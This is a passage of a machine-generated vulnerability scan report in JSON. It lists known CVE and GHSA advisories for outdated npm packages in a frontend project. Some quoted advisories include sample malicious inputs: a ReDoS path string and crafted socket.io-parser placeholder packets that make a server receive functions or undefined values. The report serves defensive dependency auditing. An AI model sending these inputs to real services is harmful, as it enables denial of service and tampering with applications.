"pkg:npm\/loader-utils@3.2.0"}]}]}, {"ruleId": "CVE-2024-4067","level": "warning","message": {"text": "CVE-2024-4067 - The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8."},"partialFingerprints": {"vulnerabilityHash": "4d77ed9026d6420573922f4237e61783"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?micromatch","index": 23 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/micromatch@4.0.4"}]}]}, {"ruleId": "GHSA-952p-6rrq-rcjv","level": "warning","message": {"text": "GHSA-952p-6rrq-rcjv - The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https:\/\/github.com\/micromatch\/micromatch\/pull\/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n"},"partialFingerprints": {"vulnerabilityHash": "d11e286ffd8372ad75457da66edf9341"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?micromatch","index": 23 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/micromatch@4.0.4"}]}]}, {"ruleId": "GHSA-f8q6-p94x-37v3","level": "warning","message": {"text": "GHSA-f8q6-p94x-37v3 - A vulnerability was found in the minimatch package. This flaw allows a Regular Expression Denial of Service (ReDoS) when calling the braceExpand function with specific arguments, resulting in a Denial of Service."},"partialFingerprints": {"vulnerabilityHash": "6f082379735a1a99c8fe36deb90e7a56"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?minimatch","index": 24 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/minimatch@3.0.4"}]}]}, {"ruleId": "CVE-2021-44906","level": "warning","message": {"text": "CVE-2021-44906 - Minimist <=1.2.5 is vulnerable to Prototype Pollution via file index.js, function setKey() (lines 69-95)."},"partialFingerprints": {"vulnerabilityHash": "2c72ea4d75b7a6222e5b6a9d9567dfa4"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?minimist","index": 25 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/minimist@1.2.5"}]}]}, {"ruleId": "GHSA-xvch-5gv4-984h","level": "warning","message": {"text": "GHSA-xvch-5gv4-984h - Minimist prior to 1.2.6 and 0.2.4 is vulnerable to Prototype Pollution via file `index.js`, function `setKey()` (lines 69-95)."},"partialFingerprints": {"vulnerabilityHash": "c1fadf30e8df09d9a7372124812efe96"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?minimist","index": 25 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/minimist@1.2.5"}]}]}, {"ruleId": "CVE-2024-55565","level": "warning","message": {"text": "CVE-2024-55565 - nanoid (aka Nano ID) before 5.0.9 mishandles non-integer values. 3.3.8 is also a fixed version."},"partialFingerprints": {"vulnerabilityHash": "efaceb27740704e07ec623a50e4d57ee"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?nanoid","index": 26 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/nanoid@3.3.1"}]}]}, {"ruleId": "GHSA-mwcw-c2x4-8c55","level": "warning","message": {"text": "GHSA-mwcw-c2x4-8c55 - When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed."},"partialFingerprints": {"vulnerabilityHash": "5cf8b51f79325bc46a2bf462219434b0"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?nanoid","index": 26 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/nanoid@3.3.1"}]}]}, {"ruleId": "CVE-2022-24771","level": "warning","message": {"text": "CVE-2022-24771 - Forge (also called `node-forge`) is a native implementation of Transport Layer Security in JavaScript. Prior to version 1.3.0, RSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used. The issue has been addressed in `node-forge` version 1.3.0. There are currently no known workarounds."},"partialFingerprints": {"vulnerabilityHash": "cfebca276f25455b55b1d30321382581"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge","index": 27 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/node-forge@1.2.1"}]}]}, {"ruleId": "CVE-2022-24772","level": "warning","message": {"text": "CVE-2022-24772 - Forge (also called `node-forge`) is a native implementation of Transport Layer Security in JavaScript. Prior to version 1.3.0, RSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used. The issue has been addressed in `node-forge` version 1.3.0. There are currently no known workarounds."},"partialFingerprints": {"vulnerabilityHash": "73a0aadcc9e293261f762a966084c0f8"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge","index": 27 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/node-forge@1.2.1"}]}]}, {"ruleId": "GHSA-cfm4-qjh2-4765","level": "warning","message": {"text": "GHSA-cfm4-qjh2-4765 - ### Impact\n\nRSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### References\n\nFor more information, please see\n[\"Bleichenbacher's RSA signature forgery based on implementation error\"](https:\/\/mailarchive.ietf.org\/arch\/msg\/openpgp\/5rnE9ZRN1AokBVj3VqblGlP63QE\/)\nby Hal Finney.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)"},"partialFingerprints": {"vulnerabilityHash": "b3f1f0ea6e9a8d4c3570dcdd4e71bce1"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge","index": 27 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/node-forge@1.2.1"}]}]}, {"ruleId": "GHSA-x4jg-mjrx-434g","level": "warning","message": {"text": "GHSA-x4jg-mjrx-434g - ### Impact\n\nRSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### References\n\nFor more information, please see\n[\"Bleichenbacher's RSA signature forgery based on implementation error\"](https:\/\/mailarchive.ietf.org\/arch\/msg\/openpgp\/5rnE9ZRN1AokBVj3VqblGlP63QE\/)\nby Hal Finney.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)"},"partialFingerprints": {"vulnerabilityHash": "0674917078cc54caec0f292efb7ed1e4"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge","index": 27 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/node-forge@1.2.1"}]}]}, {"ruleId": "CVE-2022-24773","level": "warning","message": {"text": "CVE-2022-24773 - Forge (also called `node-forge`) is a native implementation of Transport Layer Security in JavaScript. Prior to version 1.3.0, RSA PKCS#1 v1.5 signature verification code does not properly check `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest. The issue has been addressed in `node-forge` version 1.3.0. There are currently no known workarounds."},"partialFingerprints": {"vulnerabilityHash": "c547009268c0af329e8bde5225cc186f"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge","index": 27 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/node-forge@1.2.1"}]}]}, {"ruleId": "GHSA-2r2c-g63r-vccr","level": "warning","message": {"text": "GHSA-2r2c-g63r-vccr - ### Impact\n\nRSA PKCS#1 v1.5 signature verification code is not properly checking `DigestInfo` for a proper ASN.1 structure. This can lead to successful verification with signatures that contain invalid structures but a valid digest.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https:\/\/github.com\/digitalbazaar\/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)"},"partialFingerprints": {"vulnerabilityHash": "4f9a3e620d6c403724e0c23189756940"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?node-forge","index": 27 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/node-forge@1.2.1"}]}]}, {"ruleId": "CVE-2025-7339","level": "warning","message": {"text": "CVE-2025-7339 - on-headers is a node.js middleware for listening to when a response writes headers. A bug in on-headers versions `<1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`.\u00A0Users should upgrade to version 1.1.0 to receive a patch.\u00A0Uses are strongly encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array."},"partialFingerprints": {"vulnerabilityHash": "902172146fb66b7652091c99731021cf"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?on-headers","index": 28 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/on-headers@1.0.2"}]}]}, {"ruleId": "GHSA-76c9-3jph-rj3q","level": "warning","message": {"text": "GHSA-76c9-3jph-rj3q - ### Impact\n\nA bug in on-headers versions `< 1.1.0` may result in response headers being inadvertently modified when an array is passed to `response.writeHead()`\n\n### Patches\n\nUsers should upgrade to `1.1.0`\n\n### Workarounds\n\nUses are encouraged to upgrade to `1.1.0`, but this issue can be worked around by passing an object to `response.writeHead()` rather than an array."},"partialFingerprints": {"vulnerabilityHash": "c8019284479bdbce0507c394f599eb9c"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?on-headers","index": 28 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/on-headers@1.0.2"}]}]}, {"ruleId": "CVE-2024-45296","level": "warning","message": {"text": "CVE-2024-45296 - path-to-regexp turns path strings into a regular expressions. In certain cases, path-to-regexp will output a regular expression that can be exploited to cause poor performance. Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and lead to a DoS. The bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (.). For users of 0.1, upgrade to 0.1.10. All other users should upgrade to 8.0.0."},"partialFingerprints": {"vulnerabilityHash": "f6a6d754a7b5e7e4678bf38fcb8f0f3f"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?path-to-regexp","index": 29 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/path-to-regexp@0.1.7"}]}]}, {"ruleId": "GHSA-9wv6-86v2-598j","level": "warning","message": {"text": "GHSA-9wv6-86v2-598j - ### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `\/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v0.1.10)\n- [1.9.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v1.9.0)\n- [3.3.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v3.3.0)\n- [6.3.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https:\/\/github.com\/pillarjs\/path-to-regexp\/releases\/tag\/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `\/:a-:b` to `\/:a-:b([^-\/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `\/:a-:b` will produce the regular expression `\/^\\\/([^\\\/]+?)-([^\\\/]+?)\\\/?$\/`. This can be exploited by a path such as `\/a${'-a'.repeat(8_000)}\/a`. [OWASP](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `\/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https:\/\/owasp.org\/www-community\/attacks\/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https:\/\/blakeembrey.com\/posts\/2024-09-web-redos\/)"},"partialFingerprints": {"vulnerabilityHash": "76c56784037c0ff8eca0873c5141a118"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?path-to-regexp","index": 29 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/path-to-regexp@0.1.7"}]}]}, {"ruleId": "GHSA-rhx6-c78j-4q9w","level": "warning","message": {"text": "GHSA-rhx6-c78j-4q9w - ### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `\/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https:\/\/github.com\/advisories\/GHSA-9wv6-86v2-598j\n- https:\/\/blakeembrey.com\/posts\/2024-09-web-redos\/"},"partialFingerprints": {"vulnerabilityHash": "5f53d6bd6c52fb697bf3e4882af127af"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?path-to-regexp","index": 29 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/path-to-regexp@0.1.7"}]}]}, {"ruleId": "CVE-2023-44270","level": "warning","message": {"text": "CVE-2023-44270 - An issue was discovered in PostCSS before 8.4.31. The vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being included in a comment."},"partialFingerprints": {"vulnerabilityHash": "8b56fb74a19a058df52b811cd1b788cb"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?postcss","index": 30 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/postcss@8.4.5"}]}]}, {"ruleId": "GHSA-7fh5-64p2-3v2j","level": "warning","message": {"text": "GHSA-7fh5-64p2-3v2j - An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r\/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment."},"partialFingerprints": {"vulnerabilityHash": "b11fc9744fcd5e290fe7e2a7d365727d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?postcss","index": 30 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/postcss@8.4.5"}]}]}, {"ruleId": "CVE-2022-25883","level": "warning","message": {"text": "CVE-2022-25883 - Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.\r\r\r\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-25883 for details"},"partialFingerprints": {"vulnerabilityHash": "e76c0241db1f8888bb4369e1485392fc"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver","index": 31 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/semver@5.7.1"}]}]}, {"ruleId": "GHSA-c2qf-rxjj-qqgw","level": "warning","message": {"text": "GHSA-c2qf-rxjj-qqgw - Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."},"partialFingerprints": {"vulnerabilityHash": "c809e762af3e68487b2fcbb3568ee042"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver","index": 31 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/semver@5.7.1"}]}]}, {"ruleId": "CVE-2022-25883","level": "warning","message": {"text": "CVE-2022-25883 - Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.\r\r\r\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-25883 for details"},"partialFingerprints": {"vulnerabilityHash": "e76c0241db1f8888bb4369e1485392fc"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver","index": 32 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/semver@6.3.0"}]}]}, {"ruleId": "GHSA-c2qf-rxjj-qqgw","level": "warning","message": {"text": "GHSA-c2qf-rxjj-qqgw - Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."},"partialFingerprints": {"vulnerabilityHash": "c809e762af3e68487b2fcbb3568ee042"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver","index": 32 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/semver@6.3.0"}]}]}, {"ruleId": "CVE-2022-25883","level": "warning","message": {"text": "CVE-2022-25883 - Versions of the package semver before 7.5.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.\r\r\r\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2022-25883 for details"},"partialFingerprints": {"vulnerabilityHash": "e76c0241db1f8888bb4369e1485392fc"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver","index": 33 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/semver@7.0.0"}]}]}, {"ruleId": "GHSA-c2qf-rxjj-qqgw","level": "warning","message": {"text": "GHSA-c2qf-rxjj-qqgw - Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range."},"partialFingerprints": {"vulnerabilityHash": "c809e762af3e68487b2fcbb3568ee042"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?semver","index": 33 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/semver@7.0.0"}]}]}, {"ruleId": "GHSA-m6fv-jmcg-4jfg","level": "warning","message": {"text": "GHSA-m6fv-jmcg-4jfg - ### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n"},"partialFingerprints": {"vulnerabilityHash": "d343fc60b26a7681707d25a55a8caaf4"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?send","index": 34 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/send@0.17.2"}]}]}, {"ruleId": "CVE-2024-43799","level": "warning","message": {"text": "CVE-2024-43799 - Send is a library for streaming files from the file system as a http response. Send passes untrusted user input to SendStream.redirect() which executes untrusted code. This issue is patched in send 0.19.0.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-43799 for details"},"partialFingerprints": {"vulnerabilityHash": "dc49e2fe912b8c1f337ebf7dd46bd215"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?send","index": 34 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/send@0.17.2"}]}]}, {"ruleId": "GHSA-76p7-773f-r4q5","level": "warning","message": {"text": "GHSA-76p7-773f-r4q5 - A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package."},"partialFingerprints": {"vulnerabilityHash": "4767f9cf7843d3a0a980832273ad0f8f"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?serialize-javascript","index": 35 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/serialize-javascript@6.0.0"}]}]}, {"ruleId": "CVE-2024-11831","level": "warning","message": {"text": "CVE-2024-11831 - A flaw was found in npm-serialize-javascript. The vulnerability occurs because the serialize-javascript module does not properly sanitize certain inputs, such as regex or other JavaScript object types, allowing an attacker to inject malicious code. This code could be executed when deserialized by a web browser, causing Cross-site scripting (XSS) attacks. This issue is critical in environments where serialized data is sent to web clients, potentially compromising the security of the website or web application using this package.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-11831 for details"},"partialFingerprints": {"vulnerabilityHash": "d6d7c1c368efe868a02f9139d4932acf"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?serialize-javascript","index": 35 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/serialize-javascript@6.0.0"}]}]}, {"ruleId": "GHSA-cm22-4g7w-348p","level": "warning","message": {"text": "GHSA-cm22-4g7w-348p - ### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n"},"partialFingerprints": {"vulnerabilityHash": "43d7bd294de3f3a783bb29bd5de768ae"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?serve-static","index": 36 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/serve-static@1.14.2"}]}]}, {"ruleId": "CVE-2024-43800","level": "warning","message": {"text": "CVE-2024-43800 - serve-static serves static files. serve-static passes untrusted user input - even after sanitizing it - to redirect() may execute untrusted code. This issue is patched in serve-static 1.16.0.\n\nSonatype's research suggests that this CVE's details differ from those defined at NVD. See https:\/\/ossindex.sonatype.org\/vulnerability\/CVE-2024-43800 for details"},"partialFingerprints": {"vulnerabilityHash": "4ab06195cbd77ab1a14f9161ef7b353d"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?serve-static","index": 36 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/serve-static@1.14.2"}]}]}, {"ruleId": "CVE-2022-2421","level": "warning","message": {"text": "CVE-2022-2421 - Due to improper type validation in attachment parsing the Socket.io js library, it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object."},"partialFingerprints": {"vulnerabilityHash": "1dca167f090bd7e10665df60fd18a56f"},"locations": [{"physicalLocation": {"artifactLocation": {"uri": "file://\/github\/workspace\/xss\/frontend\/package-lock.json?socket.io-parser","index": 37 }},"logicalLocations": [{"fullyQualifiedName": "pkg:npm\/socket.io-parser@4.0.4"}]}]}, {"ruleId": "GHSA-qm95-pgcg-qqfq","level": "warning","message": {"text": "GHSA-qm95-pgcg-qqfq - Due to improper type validation in the `socket.io-parser` library (which is used by the `socket.io` and `socket.io-client` packages to encode and decode Socket.IO packets), it is possible to overwrite the _placeholder object which allows an attacker to place references to functions at arbitrary places in the resulting query object.\n\nExample:\n\n```js\nconst decoder = new Decoder();\n\ndecoder.on(\"decoded\", (packet) => {\n console.log(packet.data); \/\/ prints [ 'hello', [Function: splice] ]\n})\n\ndecoder.add('51-[\"hello\",{\"_placeholder\":true,\"num\":\"splice\"}]');\ndecoder.add(Buffer.from(\"world\"));\n```\n\nThis bubbles up in the `socket.io` package:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ here, \"val\" could be a function instead of a buffer\n });\n});\n```\n\n:warning: IMPORTANT NOTE :warning:\n\nYou need to make sure that the payload that you received from the client is actually a `Buffer` object:\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n if (!Buffer.isBuffer(val)) {\n socket.disconnect();\n return;\n }\n \/\/ ...\n });\n});\n```\n\n**If that's already the case, then you are not impacted by this issue, and there is no way an attacker could make your server crash (or escalate privileges, ...).**\n\nExample of values that could be sent by a malicious user:\n\n- a number that is out of bounds\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":10}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is `undefined`\n });\n});\n```\n\n- a value that is not a number, like `undefined`\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":undefined}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is `undefined`\n });\n});\n```\n\n- a string that is part of the prototype of `Array`, like \"push\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"push\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is a reference to the \"push\" function\n });\n});\n```\n\n- a string that is part of the prototype of `Object`, like \"hasOwnProperty\"\n\nSample packet: `451-[\"hello\",{\"_placeholder\":true,\"num\":\"hasOwnProperty\"}]`\n\n```js\nio.on(\"connection\", (socket) => {\n socket.on(\"hello\", (val) => {\n \/\/ val is a reference to the \"hasOwnProperty\" function\n });\n});\n```\n\nThis should be fixed by:\n\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/b5d0cb7dc56a0601a09b056beaeeb0e43b160050, included in `socket.io-parser@4.2.1`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/b559f050ee02bd90bd853b9823f8de7fa94a80d4, included in `socket.io-parser@4.0.5`\n- https:\/\/github.com\/socketio\/socket.io-parser\/commit\/04d23cecafe1b859fb03e0cbf6ba3b74dff56d14, included in 